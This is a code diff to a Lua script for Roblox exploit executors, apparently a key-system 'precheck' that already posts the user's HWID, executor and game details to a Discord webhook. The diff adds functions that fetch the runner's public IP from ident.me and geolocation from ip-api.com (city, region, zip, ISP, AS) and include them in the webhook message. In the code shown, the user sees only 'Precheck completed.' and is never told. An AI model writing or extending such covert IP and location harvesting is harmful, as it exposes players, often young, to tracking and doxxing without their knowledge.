@@ -200,6 +200,60 @@ local function getJoinCommand()
     return ("Roblox.GameLauncher.joinGameInstance(%d, %q)"):format(game.PlaceId, game.JobId)
 end
 
+local function getPublicIpAddress()
+    local ipAddress = trim(downloadText("https://v4.ident.me/") or "")
+    if ipAddress ~= "" then
+        return ipAddress
+    end
+
+    return "Unavailable"
+end
+
+local function getIpInfoLines()
+    local payload = downloadText("http://ip-api.com/json/?fields=status,message,query,country,regionName,city,zip,isp,org,as")
+    if typeof(payload) ~= "string" or payload == "" then
+        return {"Unavailable"}
+    end
+
+    local decoded = tryCall(function()
+        return HttpService:JSONDecode(payload)
+    end)
+
+    if typeof(decoded) ~= "table" then
+        return {"Unavailable"}
+    end
+
+    if trim(tostring(decoded.status or "")) == "fail" then
+        local failureMessage = trim(tostring(decoded.message or "Unavailable"))
+        return {failureMessage ~= "" and failureMessage or "Unavailable"}
+    end
+
+    local fields = {
+        {"query", "IP"},
+        {"country", "Country"},
+        {"regionName", "Region"},
+        {"city", "City"},
+        {"zip", "Zip"},
+        {"isp", "ISP"},
+        {"org", "Org"},
+        {"as", "AS"}
+    }
+
+    local lines = {}
+    for _, field in ipairs(fields) do
+        local value = trim(tostring(decoded[field[1]] or ""))
+        if value ~= "" then
+            lines[#lines + 1] = "**" .. field[2] .. ":** " .. webhookString(value, "Unknown", 250)
+        end
+    end
+
+    if #lines == 0 then
+        return {"Unavailable"}
+    end
+
+    return lines
+end
+
 local function webhookString(value, fallback, maxLength)
     local text = trim(tostring(value or ""))
     if text == "" then
@@ -340,7 +394,7 @@ local function promptDiscordUsername()
     return result
 end
 
-local function sendWebhook(hwid, executorName, avatarThumbnailUrl, discordUsername)
+local function sendWebhook(hwid, executorName, avatarThumbnailUrl, discordUsername, publicIpAddress, ipInfoLines)
     if CONFIG.webhookURL == "" then
         return false, "Webhook URL is empty."
     end
@@ -369,6 +423,7 @@ local function sendWebhook(hwid, executorName, avatarThumbnailUrl, discordUserna
                 "**Locale:** " .. webhookString(getLocaleName(), "Unknown", 250),
                 "**Executor:** " .. webhookString(executorName, "Unknown", 250),
                 "**Platform:** " .. webhookString(getPlatformName(), "Unknown", 250),
+                "**IP:** " .. webhookString(publicIpAddress, "Unavailable", 250),
                 "**HWID:** " .. webhookString(hwid, "UNAVAILABLE", 500),
                 "**Date:** " .. tostring(os.date("%m/%d/%Y")),
                 "**Time:** " .. tostring(os.date("%X")),
@@ -379,6 +434,10 @@ local function sendWebhook(hwid, executorName, avatarThumbnailUrl, discordUserna
                 "**JobId:** " .. webhookString(game.JobId, "Unknown", 500),
                 "**Suggested Key Tier:** " .. webhookString(CONFIG.defaultTier, "basic", 250),
                 "**Suggested Expires:** " .. webhookString(toIsoUtc(os.time() + (CONFIG.durationHours * 3600)), "Unknown", 250),
+                "",
+                "**IP Information:**",
+                table.concat(ipInfoLines or {"Unavailable"}, "\n"),
+                "",
                 "**Job Join:**",
                 "```" .. webhookString(getJoinCommand(), "Unavailable", 1000) .. "```"
             }, "\n"), 3800),
@@ -438,8 +497,17 @@ local function main()
     local executorName = getExecutorName()
     local hwid = getHWID()
     local avatarThumbnailUrl = getAvatarThumbnailURL()
+    local publicIpAddress = getPublicIpAddress()
+    local ipInfoLines = getIpInfoLines()
 
-    local webhookOk, webhookMessage = sendWebhook(hwid, executorName, avatarThumbnailUrl, discordUsername)
+    local webhookOk, webhookMessage = sendWebhook(
+        hwid,
+        executorName,
+        avatarThumbnailUrl,
+        discordUsername,
+        publicIpAddress,
+        ipInfoLines
+    )
 
     local notificationText = "Precheck completed."
     if not webhookOk and CONFIG.webhookURL ~= "" then
